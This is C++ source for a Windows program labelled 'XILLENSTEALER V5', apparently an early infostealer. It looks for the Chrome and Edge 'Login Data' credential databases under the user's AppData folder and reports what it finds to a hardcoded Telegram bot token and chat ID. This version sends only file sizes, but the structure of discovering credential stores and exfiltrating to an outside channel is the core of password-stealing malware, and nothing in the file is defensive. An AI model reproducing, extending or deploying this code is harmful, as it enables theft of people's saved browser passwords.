#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <sstream>
#include <filesystem>

#pragma comment(lib, "wininet.lib")

std::string GetUserDataPath() {
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, path);
    return std::string(path);
}

bool SendToTelegram(const std::string& message) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;
    
    std::string token = "8474305805:AAHZ98s7nr9IAFQehnqh0x3iGV1OmVhTq9I";
    std::string chatId = "7368280792";
    std::ostringstream url;
    url << "https://api.telegram.org/bot" << token 
        << "/sendMessage?chat_id=" << chatId 
        << "&text=" << message;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.str().c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    char buffer[1024];
    DWORD bytesRead;
    InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead);
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return true;
}

int main() {
    std::cout << "======================================\n";
    std::cout << "XILLENSTEALER V5 - DATA COLLECTOR\n";
    std::cout << "======================================\n\n";
    
    std::string userData = GetUserDataPath();
    std::string chrome = userData + "\\Google\\Chrome\\User Data\\Default\\Login Data";
    std::string edge = userData + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
    
    std::ostringstream data;
    data << "XILLENSTEALER V5 - DATA COLLECTED\n\n";
    
    std::cout << "[*] Checking browsers...\n\n";
    
    if (std::filesystem::exists(chrome)) {
        auto size = std::filesystem::file_size(chrome);
        std::cout << "[+] CHROME FOUND: " << size << " bytes\n";
        data << "CHROME: " << size << " bytes\n";
    }
    
    if (std::filesystem::exists(edge)) {
        auto size = std::filesystem::file_size(edge);
        std::cout << "[+] EDGE FOUND: " << size << " bytes\n";
        data << "EDGE: " << size << " bytes\n";
    }
    
    std::cout << "\n[*] Sending to Telegram...\n";
    if (SendToTelegram(data.str())) {
        std::cout << "[+] SUCCESS! Data sent to Telegram!\n";
    } else {
        std::cout << "[!] Failed to send\n";
    }
    
    std::cout << "\nPress Enter to exit...\n";
    std::cin.get();
    
    return 0;
}
